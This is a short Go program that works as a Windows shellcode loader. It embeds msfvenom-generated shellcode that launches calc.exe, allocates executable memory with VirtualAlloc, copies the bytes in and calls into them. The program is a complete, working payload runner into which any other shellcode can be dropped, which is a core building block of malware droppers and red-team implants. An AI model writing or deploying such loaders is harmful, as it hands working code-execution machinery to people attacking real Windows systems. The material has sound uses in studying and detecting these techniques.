package main

import (
        "fmt"
        "os"
        "syscall"
        "unsafe"
)

// ./msfvenom -p windows/exec cmd=calc.exe -f c | tr -d "\"\n"
var shellcode string = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x6a\x01\x8d\x85\xb9\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00;"

const (
        MEM_COMMIT  = 0x1000
        MEM_RESERVE = 0x2000

        PAGE_EXECUTE_READWRITE = 0x40
)

var (
        kernel32     = syscall.MustLoadDLL("kernel32.dll")
        VirtualAlloc = kernel32.MustFindProc("VirtualAlloc")
)

func SysAlloc(n uintptr) (uintptr, error) {
        addr, _, err := VirtualAlloc.Call(0, n, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
        if addr == 0 {
                return 0, err
        }
        return addr, nil
}

func main() {
        addr, err := SysAlloc(uintptr(len(shellcode)))
        if err != nil {
                fmt.Println(err)
                os.Exit(1)
        }
        b := (*[1024]byte)(unsafe.Pointer(addr))
        for x, value := range []byte(shellcode) {
                b[x] = value
        }
        syscall.Syscall(addr, 3, 3, 5, 2)
}
